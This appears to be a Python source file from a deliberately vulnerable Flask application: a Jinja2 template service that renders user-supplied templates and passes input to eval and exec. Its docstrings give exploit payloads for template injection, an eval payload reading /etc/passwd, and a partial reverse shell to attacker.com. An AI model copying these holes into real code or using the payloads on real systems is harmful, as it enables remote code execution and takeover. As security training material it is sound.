"""Template rendering service with SSTI vulnerabilities

VULNERABILITIES:
- SSTI: Jinja2 template injection
- RCE: eval/exec usage
"""

from jinja2 import Template, Environment
from flask import current_app


class TemplateService:
    """Template rendering - DELIBERATELY INSECURE"""
    
    @staticmethod
    def render_custom(template_string, context):
        """VULN: Server-Side Template Injection (SSTI)
        CVE Reference: CVE-2019-8341 (Jinja2 SSTI), CVE-2023-29689 (Pyro CMS SSTI)
        
        Exploit: template_string='{{ config.__class__.__init__.__globals__["os"].popen("id").read() }}'
        Also: '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("whoami").read() }}'
        """
        # VULN: User-controlled template string leads to RCE
        template = Template(template_string)  # VULN: Unsafe template rendering
        return template.render(context)
    
    @staticmethod
    def render_post_with_theme(post, theme_template):
        """VULN: SSTI via custom theme
        
        Exploit: theme_template containing malicious Jinja2 code
        """
        context = {
            'title': post['title'],
            'content': post['content'],
            'author': post.get('author_name', 'Unknown')
        }
        # VULN: SSTI
        return TemplateService.render_custom(theme_template, context)
    
    @staticmethod
    def evaluate_expression(expr):
        """VULN: RCE via eval
        CVE Reference: Similar to CVE-2023-0297 (PyLoad RCE)
        
        Exploit: expr='__import__("os").system("cat /etc/passwd")'
        """
        try:
            # VULN: eval allows arbitrary code execution
            result = eval(expr)
            return str(result)
        except Exception as e:
            return f"Error: {str(e)}"
    
    @staticmethod
    def execute_code(code):
        """VULN: RCE via exec
        CVE Reference: CVE-2024-42845 (Invesalius3 RCE)
        
        Exploit: code='import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));...'
        """
        output = []
        try:
            # VULN: exec allows arbitrary code execution
            exec(code, {'output': output, '__builtins__': __builtins__})
            return output
        except Exception as e:
            return [f"Error: {str(e)}"]
